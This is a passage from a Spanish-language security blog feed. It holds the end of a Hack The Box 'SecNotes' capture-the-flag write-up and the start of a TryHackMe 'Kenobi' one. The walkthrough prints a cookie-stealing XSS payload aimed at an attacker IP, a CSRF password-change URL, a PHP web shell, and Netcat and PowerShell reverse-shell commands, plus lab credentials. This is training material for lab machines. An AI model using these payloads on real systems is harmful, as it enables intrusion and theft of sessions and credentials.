&lt;p&gt;Vemos que conseguimos una petición por GET por parte de la máquina víctima, por lo que asumimos que este lee nuestros mensajes. Ya con esto podemos pensar que tenemos una posible vía potencial para hacernos con la cookie del usuario. Por lo cual, enviaremos el siguiente mensaje:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;lt;img src=&quot;http://nuestraDirecciónIP:80/cookie=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&quot;&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para nuestra sorpresa, esto no funciona, así que tendremos que buscar otra alternativa.&lt;/p&gt;

&lt;p&gt;Investigando un poco más la página web, si decidimos cambiar nuestra contraseña, nos daremos cuenta que la página no nos solicita nuestra contraseña anterior, o algún otro método de verificación en dos pasos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/19.png&quot; alt=&quot;19&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Adicionalmente, si revisamos esta petición con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp Suite&lt;/code&gt;, nos daremos cuenta que no existe algún tipo de &lt;a href=&quot;https://portswigger.net/web-security/csrf/tokens&quot;&gt;CSRF Token&lt;/a&gt;, por lo que en principio, podríamos modificar esta petición a nuestro antojo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/20.png&quot; alt=&quot;20&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo que haremos será cambiar esta petición que se está tramitando por POST, a GET. De modo que no haya que proporcionar los campos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Password&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Confirm Password&lt;/code&gt; de forma manual, los proporcionaremos a través de la propia URL.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/21.png&quot; alt=&quot;21&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para ello, desde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp Suite&lt;/code&gt;, habiendo capturado la petición del cambio de contraseña, simplemente haremos &lt;em&gt;clic derecho&lt;/em&gt;, &lt;em&gt;Change request method&lt;/em&gt;, y copiaremos la nueva petición por GET.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/22.png&quot; alt=&quot;22&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera, si añadimos &lt;em&gt;http://10.10.10.97&lt;/em&gt; al inicio de la petición que acabamos de copiar, generaremos un URL capaz de cambiar contraseñas a través del método GET; probémoslo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/23.png&quot; alt=&quot;23&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Posteriormente, proseguiremos a logearnos con la contraseña que establecimos en el URL.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/24.png&quot; alt=&quot;24&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya una vez dentro, encontraremos una nota, con lo que parece ser un usuario y contraseña para un recurso compartido; si recordamos de nuestro escaneo con &lt;em&gt;Nmap&lt;/em&gt;, el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;445&lt;/code&gt; estaba abierto.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/25.png&quot; alt=&quot;25&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;sql-injection&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;SQL Injection&lt;/h3&gt;

&lt;p&gt;Otro vector a considerar al encontrarnos frente a un panel de login sería probar &lt;a href=&quot;https://mateonitro550.github.io/SQL-Injection&quot;&gt;Inyecciones SQL&lt;/a&gt; con las cuales bypassear el panel.&lt;/p&gt;

&lt;p&gt;Al igual que cuando aplicamos fuerza bruta sobre el campo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Username&lt;/code&gt;, podemos ayudarnos de un diccionario como el mismo &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/main/Fuzzing/Databases/sqli.auth.bypass.txt&quot;&gt;SecLists&lt;/a&gt;, el cual contiene una buena cantidad de expresiones que podemos probar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/26.png&quot; alt=&quot;26&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Habiendo bypasseado el panel de login llegaremos igualmente a las credenciales del recurso compartido a nivel de red, con la diferencia que tenemos acceso a las notas de todos los usuarios, no únicamente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tyler&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/27.png&quot; alt=&quot;27&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Independientemente de como nos hayamos hecho con las credenciales, podemos empezar a analizar el recurso con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBMap&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.97 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;tyler&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;92g!mA8BGj0irkL%0G*&amp;amp;&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/28.png&quot; alt=&quot;28&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos observar que tenemos permiso de lectura y escritura sobre el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;new-site&lt;/code&gt;, echemos un vistazo de manera recursiva sobre este.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.97 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;tyler&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;92g!mA8BGj0irkL%0G*&amp;amp;&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;new-site&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/29.png&quot; alt=&quot;29&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A partir de este punto empezaremos a trabajar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt;, ya que nos resultará mucho más cómoda su interfaz de línea de comandos (CLI).&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient //10.10.10.97/new-site -U &apos;tyler&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Para saber de que se trata el contenido dentro del recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;new-site&lt;/code&gt; podemos descargarlo en nuestra máquina con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt;, aunque podemos también intuirlo en base al nombre de los archivos, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;get iisstart.htm
get iisstart.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/30.png&quot; alt=&quot;30&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Rápidamente nos daremos cuenta que estamos frente al contenido de la segunda página web, alojada en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8808&lt;/code&gt;; por lo que, dada nuestra capacidad de escritura sobre el recurso, deberíamos de poder subir contenido que se vea reflejado en el servidor web.&lt;/p&gt;

&lt;p&gt;Empecemos por subir algo simple como una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web shell&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;put cmd.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/31.png&quot; alt=&quot;31&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez subida, desde nuestro navegador, podemos acceder a ella añadiendo &lt;em&gt;/cmd.php?cmd=comando&lt;/em&gt; al url.&lt;/p&gt;

&lt;p&gt;Podemos ejecutar &lt;em&gt;ipconfig&lt;/em&gt; para corroborar que nos encontramos dentro de la máquina víctima.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/32.png&quot; alt=&quot;32&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;O &lt;em&gt;whoami&lt;/em&gt; para determinar que usuario somos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/33.png&quot; alt=&quot;33&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya a partir de este punto, lo que nos interesa como atacantes, es ganar acceso al sistema a través de una consola propiamente, para lo cual tenemos dos opciones:&lt;/p&gt;

&lt;p&gt;Podemos usar &lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;Netcat&lt;/a&gt;, para lo cual descargaremos la última versión y subiremos al servidor web el ejecutable.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;put nc64.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/34.png&quot; alt=&quot;34&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos pondremos en escucha a través del puerto que determinemos.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nc -nlvp &amp;lt;puertoCualquiera&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Para finalmente a través del navegador añadir lo siguiente al url.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/cmd.php?cmd=nc64.exe -e cmd &amp;lt;nuestraDirecciónIP&amp;gt; &amp;lt;puertoCualquiera&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/35.png&quot; alt=&quot;35&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;O por su parte podemos usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-PowerShellTcp&lt;/code&gt; de &lt;em&gt;nishang&lt;/em&gt;, para lo cual descargaremos el script.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Añadimos la siguiente línea al final del script.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Invoke-PowerShellTcp -Reverse -IPAddress &amp;lt;nuestraDirecciónIP&amp;gt; -Port &amp;lt;puertoCualquiera&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lo subimos al servidor web.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;put Invoke-PowerShellTcp.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/36.png&quot; alt=&quot;36&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos ponemos en escucha a través del puerto que determinamos anteriormente.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nc -nlvp &amp;lt;puertoCualquiera&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Para finalmente a través del navegador añadir lo siguiente al url.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/cmd.php?cmd=powershell -ep bypass .\Invoke-PowerShellTcp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/37.png&quot; alt=&quot;37&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;escalada-de-privilegios&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Escalada De Privilegios&lt;/h3&gt;

&lt;p&gt;Si empezamos a enumerar el sistema, nos daremos cuenta que dentro del &lt;em&gt;Disco Local C&lt;/em&gt; existe un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ubuntu.zip&lt;/code&gt; así como una carpeta que lleva por nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Distros&lt;/code&gt;, interesante.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/38.png&quot; alt=&quot;38&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si volvemos a revisar dentro del directorio del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tyler&lt;/code&gt; encontraremos un acceso directo a lo que parece ser una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt;, echémosle un vistazo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/39.png&quot; alt=&quot;39&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;type bash.lnk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/40.png&quot; alt=&quot;40&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De lo poco que es legible, podemos observar que tenemos en el sistema una &lt;em&gt;bash&lt;/em&gt;, ubicada en la ruta &lt;em&gt;C:\Windows\System32&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Esto significa que estamos frente a un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows Subsystem for Linux&lt;/code&gt; (WSL). Una característica que introdujo &lt;em&gt;Windows&lt;/em&gt; para poder ejectuar entornos &lt;em&gt;Linux&lt;/em&gt; sin la necesidad de usar una máquina virtual o realizar un dual-boot.&lt;/p&gt;

&lt;p&gt;Podemos corroborar esto si listamos el directorio &lt;em&gt;C:\Users\tyler\AppData\Local\Packages&lt;/em&gt;, dónde se almacenan los datos de las distribuciones para &lt;em&gt;WSL&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Tal y como encontramos inicialmente, nos hallamos frente a un subsistema &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ubuntu&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/41.png&quot; alt=&quot;41&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Veamos si encontramos algo dentro del &lt;em&gt;WSL&lt;/em&gt;, para ello podemos abrir la &lt;em&gt;bash&lt;/em&gt; bien desde el acceso directo o su ruta absoluta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/42.png&quot; alt=&quot;42&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver que directamente somos el usuario &lt;em&gt;root&lt;/em&gt; por lo que en principio tenemos máximos privilegios. Además, podemos observar que nos encontramos en la ruta &lt;em&gt;/mnt/c/Users/tyler/Desktop&lt;/em&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whoami
pwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/43.png&quot; alt=&quot;43&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por lo que, deberíamos poder movernos a través de los disintos directorios de los demás usuarios.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ls /mnt/c/Users
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sin embargo, al querer acceder al directorio del usuario &lt;em&gt;Administrator&lt;/em&gt; salta un error, por lo que, la solución no es por aquí.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/44.png&quot; alt=&quot;44&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nos dirigimos a nuestro directorio como usuario &lt;em&gt;root&lt;/em&gt;, encontraremos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt;, nuestro histórico de comandos.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /root
ls -la
cat .bash_history
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dentro del cual, encontraremos en texto plano las credenciales del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;A partir de este punto, podemos volver a conectarnos a la máquina víctima a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; pero ahora como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt; y proporcionando su contraseña.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient //10.10.10.97/C$ -U Administrator
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Esto nos permitirá acceder al recurso compartido &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C$&lt;/code&gt;, que representa el disco local C de la máquina. Desde ahí, podremos movernos por los diferentes directorios hasta localizar la flag y descargarla a nuestro equipo utilizando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Alternativamente, podemos optar por usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket-psexec&lt;/code&gt; para ejecutar comandos en la máquina víctima directamente como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-psexec administrator@10.10.10.97
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/45.png&quot; alt=&quot;45&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 28 Feb 2022 00:00:00 -0500</pubDate>
        <link>/es/SecNotes-Hack-The-Box/</link>
        <guid isPermaLink="true">/es/SecNotes-Hack-The-Box/</guid>
      </item>
    
      <item>
        <title>Kenobi - TryHackMe</title>
        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;em&gt;Kenobi&lt;/em&gt; de &lt;em&gt;TryHackMe&lt;/em&gt;. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/1.png&quot; alt=&quot;Info Card&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Reconocimiento&lt;/h3&gt;

